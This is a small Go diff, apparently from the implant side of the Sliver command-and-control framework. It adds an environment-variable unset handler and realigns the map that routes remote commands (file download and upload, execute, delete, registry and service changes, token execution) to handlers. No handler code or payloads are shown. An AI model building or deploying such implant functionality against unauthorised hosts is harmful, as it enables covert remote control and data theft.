@@ -59,6 +59,7 @@ var (
 		sliverpb.MsgRemoveServiceReq:         removeService,
 		sliverpb.MsgEnvReq:                   getEnvHandler,
 		sliverpb.MsgSetEnvReq:                setEnvHandler,
+		sliverpb.MsgUnsetEnvReq:              unsetEnvHandler,
 		sliverpb.MsgExecuteTokenReq:          executeTokenHandler,
 
 		// Platform specific
@@ -74,15 +75,15 @@ var (
 		sliverpb.MsgRegistryCreateKeyReq: regCreateKeyHandler,
 
 		// Generic
-		sliverpb.MsgPing:        pingHandler,
-		sliverpb.MsgLsReq:       dirListHandler,
-		sliverpb.MsgDownloadReq: downloadHandler,
-		sliverpb.MsgUploadReq:   uploadHandler,
-		sliverpb.MsgCdReq:       cdHandler,
-		sliverpb.MsgPwdReq:      pwdHandler,
-		sliverpb.MsgRmReq:       rmHandler,
-		sliverpb.MsgMkdirReq:    mkdirHandler,
-		sliverpb.MsgExecuteReq:  executeHandler,
+		sliverpb.MsgPing:                 pingHandler,
+		sliverpb.MsgLsReq:                dirListHandler,
+		sliverpb.MsgDownloadReq:          downloadHandler,
+		sliverpb.MsgUploadReq:            uploadHandler,
+		sliverpb.MsgCdReq:                cdHandler,
+		sliverpb.MsgPwdReq:               pwdHandler,
+		sliverpb.MsgRmReq:                rmHandler,
+		sliverpb.MsgMkdirReq:             mkdirHandler,
+		sliverpb.MsgExecuteReq:           executeHandler,
 		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
 		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,
 
